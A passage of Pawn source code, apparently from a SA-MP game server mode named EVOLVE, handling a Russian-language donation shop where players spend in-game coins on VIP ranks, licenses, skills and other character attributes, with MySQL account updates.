						  {FFFFFF}[13] Приобрести ''Навык таксиста''\t{F3FF02}500 {FFFFFF}COINS",
						  PlayerInfo[playerid][pName],
						  PlayerInfo[playerid][pDonateMoney],
						  PlayerInfo[playerid][pDonateAccount]);
						  ShowPlayerDialogEx(playerid,29322,DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Донат [ {AE443D}/viphelp{FFFFFF} ] | {AE443D}EVOLVE", string, "Выбрать", "Отмена");
					 }
					 case 6:
					 {
                          if(PlayerInfo[playerid][pDonateMoney] < 3000)
						  {
						      SCM(playerid,COLOR_GREY,"Недостаточно COINS для покупки VIP GOLD");
                              format(string, 2500, "{FFFFFF}Наименование\tСтоимость\n\
							  {FFFFFF}[0] Пользователь\t\t{AE443D}%s{FFFFFF}\n\
							  {FFFFFF}[1] {F3FF02}GOLD {FFFFFF}COINS\t\t{AE443D}%i/%i{FFFFFF}\n\
							  {FFFFFF}[2] Конвентировать в игровую валюту\t{F3FF02}200+ {FFFFFF}COINS\n\
							  {FFFFFF}[3] Снять предупреждение\t{F3FF02}400 {FFFFFF}COINS\n\
							  {FFFFFF}[4] Приобрести VIP BRONZE [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}1000 {FFFFFF}COINS\n\
							  {FFFFFF}[5] Приобрести {00FFEE}VIP{FFFFFF} SILVER [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}2000 {FFFFFF}COINS\n\
							  {FFFFFF}[6] Приобрести {F3FF02}VIP{FFFFFF} GOLD [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}3000 {FFFFFF}COINS\n\
							  {FFFFFF}[7] Вылечиться от наркозависимости\t{F3FF02}300 {FFFFFF}COINS\n\
							  {FFFFFF}[8] Приобрести ''Наркозависимость''\t{F3FF02}400 {FFFFFF}COINS\n\
							  {FFFFFF}[9] Приобрести ''Комплект лицензий''\t{F3FF02}200 {FFFFFF}COINS\n\
							  {FFFFFF}[10] Приобрести ''Навык стрельбы''\t{F3FF02}300 {FFFFFF}COINS\n\
							  {FFFFFF}[11] Приобрести ''Законопослушность''\t{F3FF02}600 {FFFFFF}COINS\n\
							  {FFFFFF}[12] Приобрести ''Навык дальнобойщика''\t{F3FF02}2000 {FFFFFF}COINS\n\
							  {FFFFFF}[13] Приобрести ''Навык таксиста''\t{F3FF02}500 {FFFFFF}COINS",
							  PlayerInfo[playerid][pName],
							  PlayerInfo[playerid][pDonateMoney],
							  PlayerInfo[playerid][pDonateAccount]);
							  ShowPlayerDialogEx(playerid,29322,DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Донат [ {AE443D}/viphelp{FFFFFF} ] | {AE443D}EVOLVE", string, "Выбрать", "Отмена");
							  return true;
						  }
						  PlayerInfo[playerid][pDonateAccount] += 3000;
						  PlayerInfo[playerid][pDonateMoney] -= 3000;
	 				      PlayerInfo[playerid][pDonateRank] = 3;
	 				      PlayerInfo[playerid][pBank] += 1500000;
	 				      GameTextForPlayer(playerid, "~g~+1.500.000$", 2000, 1);
					      SCM(playerid, COLOR_GREEN,"Вы приобрели {F3FF02}VIP {FFFFFF}GOLD за {F3FF02}3000 {FFFFFF}COINS!");
				      	  mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pDonateRank = '%i', pDonateMoney = '%i', pDonateAccount = '%i', pBank = '%i' WHERE name = '%e'", PlayerInfo[playerid][pDonateRank], PlayerInfo[playerid][pDonateMoney], PlayerInfo[playerid][pDonateAccount], PlayerInfo[playerid][pBank], PlayerInfo[playerid][pName]);
	                      mysql_function_query(DATABASE,QUERY,false,"","");
                          format(string, 2500, "{FFFFFF}Наименование\tСтоимость\n\
						  {FFFFFF}[0] Пользователь\t\t{AE443D}%s{FFFFFF}\n\
						  {FFFFFF}[1] {F3FF02}GOLD {FFFFFF}COINS\t\t{AE443D}%i/%i{FFFFFF}\n\
						  {FFFFFF}[2] Конвентировать в игровую валюту\t{F3FF02}200+ {FFFFFF}COINS\n\
						  {FFFFFF}[3] Снять предупреждение\t{F3FF02}400 {FFFFFF}COINS\n\
						  {FFFFFF}[4] Приобрести VIP BRONZE [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}1000 {FFFFFF}COINS\n\
						  {FFFFFF}[5] Приобрести {00FFEE}VIP{FFFFFF} SILVER [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}2000 {FFFFFF}COINS\n\
						  {FFFFFF}[6] Приобрести {F3FF02}VIP{FFFFFF} GOLD [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}3000 {FFFFFF}COINS\n\
						  {FFFFFF}[7] Вылечиться от наркозависимости\t{F3FF02}300 {FFFFFF}COINS\n\
						  {FFFFFF}[8] Приобрести ''Наркозависимость''\t{F3FF02}400 {FFFFFF}COINS\n\
						  {FFFFFF}[9] Приобрести ''Комплект лицензий''\t{F3FF02}200 {FFFFFF}COINS\n\
						  {FFFFFF}[10] Приобрести ''Навык стрельбы''\t{F3FF02}300 {FFFFFF}COINS\n\
						  {FFFFFF}[11] Приобрести ''Законопослушность''\t{F3FF02}600 {FFFFFF}COINS\n\
						  {FFFFFF}[12] Приобрести ''Навык дальнобойщика''\t{F3FF02}2000 {FFFFFF}COINS\n\
						  {FFFFFF}[13] Приобрести ''Навык таксиста''\t{F3FF02}500 {FFFFFF}COINS",
						  PlayerInfo[playerid][pName],
						  PlayerInfo[playerid][pDonateMoney],
						  PlayerInfo[playerid][pDonateAccount]);
						  ShowPlayerDialogEx(playerid,29322,DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Донат [ {AE443D}/viphelp{FFFFFF} ] | {AE443D}EVOLVE", string, "Выбрать", "Отмена");
					 }
					 case 7:
					 {
                        if(PlayerInfo[playerid][pDonateMoney] < 300)
					    {
					        SCM(playerid,COLOR_GREY,"Недостаточно COINS для лечения наркозависимости!");
                            format(string, 2500, "{FFFFFF}Наименование\tСтоимость\n\
						    {FFFFFF}[0] Пользователь\t\t{AE443D}%s{FFFFFF}\n\
						    {FFFFFF}[1] {F3FF02}GOLD {FFFFFF}COINS\t\t{AE443D}%i/%i{FFFFFF}\n\
						    {FFFFFF}[2] Конвентировать в игровую валюту\t{F3FF02}200+ {FFFFFF}COINS\n\
						    {FFFFFF}[3] Снять предупреждение\t{F3FF02}400 {FFFFFF}COINS\n\
						    {FFFFFF}[4] Приобрести VIP BRONZE [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}1000 {FFFFFF}COINS\n\
						    {FFFFFF}[5] Приобрести {00FFEE}VIP{FFFFFF} SILVER [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}2000 {FFFFFF}COINS\n\
						    {FFFFFF}[6] Приобрести {F3FF02}VIP{FFFFFF} GOLD [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}3000 {FFFFFF}COINS\n\
						    {FFFFFF}[7] Вылечиться от наркозависимости\t{F3FF02}300 {FFFFFF}COINS\n\
						    {FFFFFF}[8] Приобрести ''Наркозависимость''\t{F3FF02}400 {FFFFFF}COINS\n\
						    {FFFFFF}[9] Приобрести ''Комплект лицензий''\t{F3FF02}200 {FFFFFF}COINS\n\
						    {FFFFFF}[10] Приобрести ''Навык стрельбы''\t{F3FF02}300 {FFFFFF}COINS\n\
						    {FFFFFF}[11] Приобрести ''Законопослушность''\t{F3FF02}600 {FFFFFF}COINS\n\
						    {FFFFFF}[12] Приобрести ''Навык дальнобойщика''\t{F3FF02}2000 {FFFFFF}COINS\n\
						    {FFFFFF}[13] Приобрести ''Навык таксиста''\t{F3FF02}500 {FFFFFF}COINS",
						    PlayerInfo[playerid][pName],
						    PlayerInfo[playerid][pDonateMoney],
						    PlayerInfo[playerid][pDonateAccount]);
						    ShowPlayerDialogEx(playerid,29322,DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Донат [ {AE443D}/viphelp{FFFFFF} ] | {AE443D}EVOLVE", string, "Выбрать", "Отмена");
						    return true;
					    }
					    PlayerInfo[playerid][pDonateAccount] += 300;
					    PlayerInfo[playerid][pDonateMoney] -= 300;
						PlayerInfo[playerid][pAddiction] = 0;
                        SCM(playerid, COLOR_GREEN,"Вы приобрели вылечиться от наркозависимости за {F3FF02}300 {FFFFFF}COINS!");
			      	    mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pAddiction = '%i', pDonateMoney = '%i', pDonateAccount = '%i' WHERE name = '%e'", PlayerInfo[playerid][pAddiction], PlayerInfo[playerid][pDonateMoney], PlayerInfo[playerid][pDonateAccount], PlayerInfo[playerid][pName]);
                        mysql_function_query(DATABASE,QUERY,false,"","");
                        format(string, 2500, "{FFFFFF}Наименование\tСтоимость\n\
					    {FFFFFF}[0] Пользователь\t\t{AE443D}%s{FFFFFF}\n\
					    {FFFFFF}[1] {F3FF02}GOLD {FFFFFF}COINS\t\t{AE443D}%i/%i{FFFFFF}\n\
					    {FFFFFF}[2] Конвентировать в игровую валюту\t{F3FF02}200+ {FFFFFF}COINS\n\
					    {FFFFFF}[3] Снять предупреждение\t{F3FF02}400 {FFFFFF}COINS\n\
					    {FFFFFF}[4] Приобрести VIP BRONZE [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}1000 {FFFFFF}COINS\n\
					    {FFFFFF}[5] Приобрести {00FFEE}VIP{FFFFFF} SILVER [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}2000 {FFFFFF}COINS\n\
					    {FFFFFF}[6] Приобрести {F3FF02}VIP{FFFFFF} GOLD [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}3000 {FFFFFF}COINS\n\
					    {FFFFFF}[7] Вылечиться от наркозависимости\t{F3FF02}300 {FFFFFF}COINS\n\
					    {FFFFFF}[8] Приобрести ''Наркозависимость''\t{F3FF02}400 {FFFFFF}COINS\n\
					    {FFFFFF}[9] Приобрести ''Комплект лицензий''\t{F3FF02}200 {FFFFFF}COINS\n\
					    {FFFFFF}[10] Приобрести ''Навык стрельбы''\t{F3FF02}300 {FFFFFF}COINS\n\
					    {FFFFFF}[11] Приобрести ''Законопослушность''\t{F3FF02}600 {FFFFFF}COINS\n\
					    {FFFFFF}[12] Приобрести ''Навык дальнобойщика''\t{F3FF02}2000 {FFFFFF}COINS\n\
					    {FFFFFF}[13] Приобрести ''Навык таксиста''\t{F3FF02}500 {FFFFFF}COINS",
					    PlayerInfo[playerid][pName],
					    PlayerInfo[playerid][pDonateMoney],
					    PlayerInfo[playerid][pDonateAccount]);
					    ShowPlayerDialogEx(playerid,29322,DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Донат [ {AE443D}/viphelp{FFFFFF} ] | {AE443D}EVOLVE", string, "Выбрать", "Отмена");
				 	 }
					 case 8:
					 {
                        if(PlayerInfo[playerid][pDonateMoney] < 400)
					    {
					        SCM(playerid,COLOR_GREY,"Недостаточно COINS для приобретения наркозависимости");
                            format(string, 2500, "{FFFFFF}Наименование\tСтоимость\n\
						    {FFFFFF}[0] Пользователь\t\t{AE443D}%s{FFFFFF}\n\
						    {FFFFFF}[1] {F3FF02}GOLD {FFFFFF}COINS\t\t{AE443D}%i/%i{FFFFFF}\n\
						    {FFFFFF}[2] Конвентировать в игровую валюту\t{F3FF02}200+ {FFFFFF}COINS\n\
						    {FFFFFF}[3] Снять предупреждение\t{F3FF02}400 {FFFFFF}COINS\n\
						    {FFFFFF}[4] Приобрести VIP BRONZE [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}1000 {FFFFFF}COINS\n\
						    {FFFFFF}[5] Приобрести {00FFEE}VIP{FFFFFF} SILVER [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}2000 {FFFFFF}COINS\n\
						    {FFFFFF}[6] Приобрести {F3FF02}VIP{FFFFFF} GOLD [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}3000 {FFFFFF}COINS\n\
						    {FFFFFF}[7] Вылечиться от наркозависимости\t{F3FF02}300 {FFFFFF}COINS\n\
						    {FFFFFF}[8] Приобрести ''Наркозависимость''\t{F3FF02}400 {FFFFFF}COINS\n\
						    {FFFFFF}[9] Приобрести ''Комплект лицензий''\t{F3FF02}200 {FFFFFF}COINS\n\
						    {FFFFFF}[10] Приобрести ''Навык стрельбы''\t{F3FF02}300 {FFFFFF}COINS\n\
						    {FFFFFF}[11] Приобрести ''Законопослушность''\t{F3FF02}600 {FFFFFF}COINS\n\
						    {FFFFFF}[12] Приобрести ''Навык дальнобойщика''\t{F3FF02}2000 {FFFFFF}COINS\n\
						    {FFFFFF}[13] Приобрести ''Навык таксиста''\t{F3FF02}500 {FFFFFF}COINS",
						    PlayerInfo[playerid][pName],
						    PlayerInfo[playerid][pDonateMoney],
						    PlayerInfo[playerid][pDonateAccount]);
						    ShowPlayerDialogEx(playerid,29322,DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Донат [ {AE443D}/viphelp{FFFFFF} ] | {AE443D}EVOLVE", string, "Выбрать", "Отмена");
						    return true;
					    }
					    PlayerInfo[playerid][pDonateAccount] += 400;
					    PlayerInfo[playerid][pDonateMoney] -= 400;
						PlayerInfo[playerid][pAddiction] = 5000;
                        SCM(playerid, COLOR_GREEN,"Вы приобрели наркозависимость за {F3FF02}400 {FFFFFF}COINS!");
			      	    mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pAddiction = '%i', pDonateMoney = '%i', pDonateAccount = '%i' WHERE name = '%e'", PlayerInfo[playerid][pAddiction], PlayerInfo[playerid][pDonateMoney], PlayerInfo[playerid][pDonateAccount], PlayerInfo[playerid][pName]);
                        mysql_function_query(DATABASE,QUERY,false,"","");
                        format(string, 2500, "{FFFFFF}Наименование\tСтоимость\n\
					    {FFFFFF}[0] Пользователь\t\t{AE443D}%s{FFFFFF}\n\
					    {FFFFFF}[1] {F3FF02}GOLD {FFFFFF}COINS\t\t{AE443D}%i/%i{FFFFFF}\n\
					    {FFFFFF}[2] Конвентировать в игровую валюту\t{F3FF02}200+ {FFFFFF}COINS\n\
					    {FFFFFF}[3] Снять предупреждение\t{F3FF02}400 {FFFFFF}COINS\n\
					    {FFFFFF}[4] Приобрести VIP BRONZE [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}1000 {FFFFFF}COINS\n\
					    {FFFFFF}[5] Приобрести {00FFEE}VIP{FFFFFF} SILVER [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}2000 {FFFFFF}COINS\n\
					    {FFFFFF}[6] Приобрести {F3FF02}VIP{FFFFFF} GOLD [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}3000 {FFFFFF}COINS\n\
					    {FFFFFF}[7] Вылечиться от наркозависимости\t{F3FF02}300 {FFFFFF}COINS\n\
					    {FFFFFF}[8] Приобрести ''Наркозависимость''\t{F3FF02}400 {FFFFFF}COINS\n\
					    {FFFFFF}[9] Приобрести ''Комплект лицензий''\t{F3FF02}200 {FFFFFF}COINS\n\
					    {FFFFFF}[10] Приобрести ''Навык стрельбы''\t{F3FF02}300 {FFFFFF}COINS\n\
					    {FFFFFF}[11] Приобрести ''Законопослушность''\t{F3FF02}600 {FFFFFF}COINS\n\
					    {FFFFFF}[12] Приобрести ''Навык дальнобойщика''\t{F3FF02}2000 {FFFFFF}COINS\n\
					    {FFFFFF}[13] Приобрести ''Навык таксиста''\t{F3FF02}500 {FFFFFF}COINS",
					    PlayerInfo[playerid][pName],
					    PlayerInfo[playerid][pDonateMoney],
					    PlayerInfo[playerid][pDonateAccount]);
					    ShowPlayerDialogEx(playerid,29322,DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Донат [ {AE443D}/viphelp{FFFFFF} ] | {AE443D}EVOLVE", string, "Выбрать", "Отмена");
					 }
					 case 9:
					 {
                          if(PlayerInfo[playerid][pDonateMoney] < 200)
						  {
						      SCM(playerid,COLOR_GREY,"Недостаточно COINS для приобретения коплекта лицензий");
                              format(string, 2500, "{FFFFFF}Наименование\tСтоимость\n\
							  {FFFFFF}[0] Пользователь\t\t{AE443D}%s{FFFFFF}\n\
							  {FFFFFF}[1] {F3FF02}GOLD {FFFFFF}COINS\t\t{AE443D}%i/%i{FFFFFF}\n\
							  {FFFFFF}[2] Конвентировать в игровую валюту\t{F3FF02}200+ {FFFFFF}COINS\n\
							  {FFFFFF}[3] Снять предупреждение\t{F3FF02}400 {FFFFFF}COINS\n\
							  {FFFFFF}[4] Приобрести VIP BRONZE [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}1000 {FFFFFF}COINS\n\
							  {FFFFFF}[5] Приобрести {00FFEE}VIP{FFFFFF} SILVER [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}2000 {FFFFFF}COINS\n\
							  {FFFFFF}[6] Приобрести {F3FF02}VIP{FFFFFF} GOLD [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}3000 {FFFFFF}COINS\n\
							  {FFFFFF}[7] Вылечиться от наркозависимости\t{F3FF02}300 {FFFFFF}COINS\n\
							  {FFFFFF}[8] Приобрести ''Наркозависимость''\t{F3FF02}400 {FFFFFF}COINS\n\
							  {FFFFFF}[9] Приобрести ''Комплект лицензий''\t{F3FF02}200 {FFFFFF}COINS\n\
							  {FFFFFF}[10] Приобрести ''Навык стрельбы''\t{F3FF02}300 {FFFFFF}COINS\n\
							  {FFFFFF}[11] Приобрести ''Законопослушность''\t{F3FF02}600 {FFFFFF}COINS\n\
							  {FFFFFF}[12] Приобрести ''Навык дальнобойщика''\t{F3FF02}2000 {FFFFFF}COINS\n\
							  {FFFFFF}[13] Приобрести ''Навык таксиста''\t{F3FF02}500 {FFFFFF}COINS",
							  PlayerInfo[playerid][pName],
							  PlayerInfo[playerid][pDonateMoney],
							  PlayerInfo[playerid][pDonateAccount]);
							  ShowPlayerDialogEx(playerid,29322,DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Донат [ {AE443D}/viphelp{FFFFFF} ] | {AE443D}EVOLVE", string, "Выбрать", "Отмена");
							  return true;
						  }
						  PlayerInfo[playerid][pDonateAccount] += 200;
						  PlayerInfo[playerid][pDonateMoney] -= 200;
                          PlayerInfo[playerid][pCarLic] = 1;
			              PlayerInfo[playerid][pFishLic] = 1;
						  PlayerInfo[playerid][pBoatLic] = 1;
						  PlayerInfo[playerid][pFlyLic] = 1;
						  PlayerInfo[playerid][pGunLic] = 1;
					      SCM(playerid, COLOR_GREEN,"Вы приобрели комплект лицензий за {F3FF02}200 {FFFFFF}COINS!");
						  mysql_format(DATABASE,QUERY,230, "UPDATE `"TABLE_ACCOUNTS"` SET pCarLic = '%i', pFishLic = '%i', pBoatLic = '%i', pFlyLic = '%i', pGunLic = '%i', pDonateMoney = '%i', pDonateAccount = '%i' WHERE name = '%e'", PlayerInfo[playerid][pCarLic], PlayerInfo[playerid][pFishLic], PlayerInfo[playerid][pBoatLic], PlayerInfo[playerid][pFlyLic], PlayerInfo[playerid][pGunLic], PlayerInfo[playerid][pDonateMoney], PlayerInfo[playerid][pDonateAccount], PlayerInfo[playerid][pName]);
                          mysql_function_query(DATABASE,QUERY,false,"","");
                          format(string, 2500, "{FFFFFF}Наименование\tСтоимость\n\
						  {FFFFFF}[0] Пользователь\t\t{AE443D}%s{FFFFFF}\n\
						  {FFFFFF}[1] {F3FF02}GOLD {FFFFFF}COINS\t\t{AE443D}%i/%i{FFFFFF}\n\
						  {FFFFFF}[2] Конвентировать в игровую валюту\t{F3FF02}200+ {FFFFFF}COINS\n\
						  {FFFFFF}[3] Снять предупреждение\t{F3FF02}400 {FFFFFF}COINS\n\
						  {FFFFFF}[4] Приобрести VIP BRONZE [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}1000 {FFFFFF}COINS\n\
						  {FFFFFF}[5] Приобрести {00FFEE}VIP{FFFFFF} SILVER [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}2000 {FFFFFF}COINS\n\
						  {FFFFFF}[6] Приобрести {F3FF02}VIP{FFFFFF} GOLD [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}3000 {FFFFFF}COINS\n\
						  {FFFFFF}[7] Вылечиться от наркозависимости\t{F3FF02}300 {FFFFFF}COINS\n\
						  {FFFFFF}[8] Приобрести ''Наркозависимость''\t{F3FF02}400 {FFFFFF}COINS\n\
						  {FFFFFF}[9] Приобрести ''Комплект лицензий''\t{F3FF02}200 {FFFFFF}COINS\n\
						  {FFFFFF}[10] Приобрести ''Навык стрельбы''\t{F3FF02}300 {FFFFFF}COINS\n\
						  {FFFFFF}[11] Приобрести ''Законопослушность''\t{F3FF02}600 {FFFFFF}COINS\n\
						  {FFFFFF}[12] Приобрести ''Навык дальнобойщика''\t{F3FF02}2000 {FFFFFF}COINS\n\
						  {FFFFFF}[13] Приобрести ''Навык таксиста''\t{F3FF02}500 {FFFFFF}COINS",
						  PlayerInfo[playerid][pName],
						  PlayerInfo[playerid][pDonateMoney],
						  PlayerInfo[playerid][pDonateAccount]);
						  ShowPlayerDialogEx(playerid,29322,DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Донат [ {AE443D}/viphelp{FFFFFF} ] | {AE443D}EVOLVE", string, "Выбрать", "Отмена");
					 }
					 case 10:
					 {
                          if(PlayerInfo[playerid][pDonateMoney] < 300)
						  {
						      SCM(playerid,COLOR_GREY,"Недостаточно COINS для приобретения навыков стрельбы");
                              format(string, 2500, "{FFFFFF}Наименование\tСтоимость\n\
							  {FFFFFF}[0] Пользователь\t\t{AE443D}%s{FFFFFF}\n\
							  {FFFFFF}[1] {F3FF02}GOLD {FFFFFF}COINS\t\t{AE443D}%i/%i{FFFFFF}\n\
							  {FFFFFF}[2] Конвентировать в игровую валюту\t{F3FF02}200+ {FFFFFF}COINS\n\
							  {FFFFFF}[3] Снять предупреждение\t{F3FF02}400 {FFFFFF}COINS\n\
							  {FFFFFF}[4] Приобрести VIP BRONZE [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}1000 {FFFFFF}COINS\n\
							  {FFFFFF}[5] Приобрести {00FFEE}VIP{FFFFFF} SILVER [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}2000 {FFFFFF}COINS\n\
							  {FFFFFF}[6] Приобрести {F3FF02}VIP{FFFFFF} GOLD [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}3000 {FFFFFF}COINS\n\
							  {FFFFFF}[7] Вылечиться от наркозависимости\t{F3FF02}300 {FFFFFF}COINS\n\
							  {FFFFFF}[8] Приобрести ''Наркозависимость''\t{F3FF02}400 {FFFFFF}COINS\n\
							  {FFFFFF}[9] Приобрести ''Комплект лицензий''\t{F3FF02}200 {FFFFFF}COINS\n\
							  {FFFFFF}[10] Приобрести ''Навык стрельбы''\t{F3FF02}300 {FFFFFF}COINS\n\
							  {FFFFFF}[11] Приобрести ''Законопослушность''\t{F3FF02}600 {FFFFFF}COINS\n\
							  {FFFFFF}[12] Приобрести ''Навык дальнобойщика''\t{F3FF02}2000 {FFFFFF}COINS\n\
							  {FFFFFF}[13] Приобрести ''Навык таксиста''\t{F3FF02}500 {FFFFFF}COINS",
							  PlayerInfo[playerid][pName],
							  PlayerInfo[playerid][pDonateMoney],
							  PlayerInfo[playerid][pDonateAccount]);
							  ShowPlayerDialogEx(playerid,29322,DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Донат [ {AE443D}/viphelp{FFFFFF} ] | {AE443D}EVOLVE", string, "Выбрать", "Отмена");
							  return true;
						  }
						  SCM(playerid, COLOR_GREEN,"Вы приобрели навык стрельбы за {F3FF02}300 {FFFFFF}COINS!");
						  PlayerInfo[playerid][pDonateAccount] += 300;
						  PlayerInfo[playerid][pDonateMoney] -= 300;
     	                  for(new x = 0; x < 6; x++)
						  PlayerInfo[playerid][pGunSkill][x] = 100;
						  SetPlayerSkills(playerid);
						  mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pGunSkills = '%i,%i,%i,%i,%i,%i', pDonateMoney = '%i', pDonateAccount = '%i' WHERE name = '%e'", PlayerInfo[playerid][pGunSkill][0],PlayerInfo[playerid][pGunSkill][1],PlayerInfo[playerid][pGunSkill][2],PlayerInfo[playerid][pGunSkill][3],PlayerInfo[playerid][pGunSkill][4],PlayerInfo[playerid][pGunSkill][5], PlayerInfo[playerid][pDonateMoney], PlayerInfo[playerid][pDonateAccount], PlayerInfo[playerid][pName]);
					      mysql_function_query(DATABASE,QUERY,false,"","");
                          format(string, 2500, "{FFFFFF}Наименование\tСтоимость\n\
						  {FFFFFF}[0] Пользователь\t\t{AE443D}%s{FFFFFF}\n\
						  {FFFFFF}[1] {F3FF02}GOLD {FFFFFF}COINS\t\t{AE443D}%i/%i{FFFFFF}\n\
						  {FFFFFF}[2] Конвентировать в игровую валюту\t{F3FF02}200+ {FFFFFF}COINS\n\
						  {FFFFFF}[3] Снять предупреждение\t{F3FF02}400 {FFFFFF}COINS\n\
						  {FFFFFF}[4] Приобрести VIP BRONZE [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}1000 {FFFFFF}COINS\n\
						  {FFFFFF}[5] Приобрести {00FFEE}VIP{FFFFFF} SILVER [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}2000 {FFFFFF}COINS\n\
						  {FFFFFF}[6] Приобрести {F3FF02}VIP{FFFFFF} GOLD [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}3000 {FFFFFF}COINS\n\
						  {FFFFFF}[7] Вылечиться от наркозависимости\t{F3FF02}300 {FFFFFF}COINS\n\
						  {FFFFFF}[8] Приобрести ''Наркозависимость''\t{F3FF02}400 {FFFFFF}COINS\n\
						  {FFFFFF}[9] Приобрести ''Комплект лицензий''\t{F3FF02}200 {FFFFFF}COINS\n\
						  {FFFFFF}[10] Приобрести ''Навык стрельбы''\t{F3FF02}300 {FFFFFF}COINS\n\
						  {FFFFFF}[11] Приобрести ''Законопослушность''\t{F3FF02}600 {FFFFFF}COINS\n\
						  {FFFFFF}[12] Приобрести ''Навык дальнобойщика''\t{F3FF02}2000 {FFFFFF}COINS\n\
						  {FFFFFF}[13] Приобрести ''Навык таксиста''\t{F3FF02}500 {FFFFFF}COINS",
						  PlayerInfo[playerid][pName],
						  PlayerInfo[playerid][pDonateMoney],
						  PlayerInfo[playerid][pDonateAccount]);
						  ShowPlayerDialogEx(playerid,29322,DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Донат [ {AE443D}/viphelp{FFFFFF} ] | {AE443D}EVOLVE", string, "Выбрать", "Отмена");
					 }
					 case 11:
					 {
                          if(PlayerInfo[playerid][pDonateMoney] < 600)
						  {
						      SCM(playerid,COLOR_GREY,"Недостаточно COINS для приобретения законопослушности");
                              format(string, 2500, "{FFFFFF}Наименование\tСтоимость\n\
							  {FFFFFF}[0] Пользователь\t\t{AE443D}%s{FFFFFF}\n\
							  {FFFFFF}[1] {F3FF02}GOLD {FFFFFF}COINS\t\t{AE443D}%i/%i{FFFFFF}\n\
							  {FFFFFF}[2] Конвентировать в игровую валюту\t{F3FF02}200+ {FFFFFF}COINS\n\
							  {FFFFFF}[3] Снять предупреждение\t{F3FF02}400 {FFFFFF}COINS\n\
							  {FFFFFF}[4] Приобрести VIP BRONZE [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}1000 {FFFFFF}COINS\n\
							  {FFFFFF}[5] Приобрести {00FFEE}VIP{FFFFFF} SILVER [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}2000 {FFFFFF}COINS\n\
							  {FFFFFF}[6] Приобрести {F3FF02}VIP{FFFFFF} GOLD [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}3000 {FFFFFF}COINS\n\
							  {FFFFFF}[7] Вылечиться от наркозависимости\t{F3FF02}300 {FFFFFF}COINS\n\
							  {FFFFFF}[8] Приобрести ''Наркозависимость''\t{F3FF02}400 {FFFFFF}COINS\n\
							  {FFFFFF}[9] Приобрести ''Комплект лицензий''\t{F3FF02}200 {FFFFFF}COINS\n\
							  {FFFFFF}[10] Приобрести ''Навык стрельбы''\t{F3FF02}300 {FFFFFF}COINS\n\
							  {FFFFFF}[11] Приобрести ''Законопослушность''\t{F3FF02}600 {FFFFFF}COINS\n\
							  {FFFFFF}[12] Приобрести ''Навык дальнобойщика''\t{F3FF02}2000 {FFFFFF}COINS\n\
							  {FFFFFF}[13] Приобрести ''Навык таксиста''\t{F3FF02}500 {FFFFFF}COINS",
							  PlayerInfo[playerid][pName],
							  PlayerInfo[playerid][pDonateMoney],
							  PlayerInfo[playerid][pDonateAccount]);
							  ShowPlayerDialogEx(playerid,29322,DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Донат [ {AE443D}/viphelp{FFFFFF} ] | {AE443D}EVOLVE", string, "Выбрать", "Отмена");
							  return true;
						  }
						  PlayerInfo[playerid][pDonateAccount] += 600;
						  PlayerInfo[playerid][pDonateMoney] -= 600;
						  PlayerInfo[playerid][pZakonp] = 100;
						  SCM(playerid, COLOR_GREEN,"Вы приобрели законопослушность за {F3FF02}600 {FFFFFF}COINS!");
						  mysql_format(DATABASE,QUERY,230, "UPDATE `"TABLE_ACCOUNTS"` SET pZakonp = '%i', pDonateMoney = '%i', pDonateAccount = '%i' WHERE name = '%e'", PlayerInfo[playerid][pZakonp], PlayerInfo[playerid][pDonateMoney], PlayerInfo[playerid][pDonateAccount], PlayerInfo[playerid][pName]);
                          mysql_function_query(DATABASE,QUERY,false,"","");
                          format(string, 2500, "{FFFFFF}Наименование\tСтоимость\n\
						  {FFFFFF}[0] Пользователь\t\t{AE443D}%s{FFFFFF}\n\
						  {FFFFFF}[1] {F3FF02}GOLD {FFFFFF}COINS\t\t{AE443D}%i/%i{FFFFFF}\n\
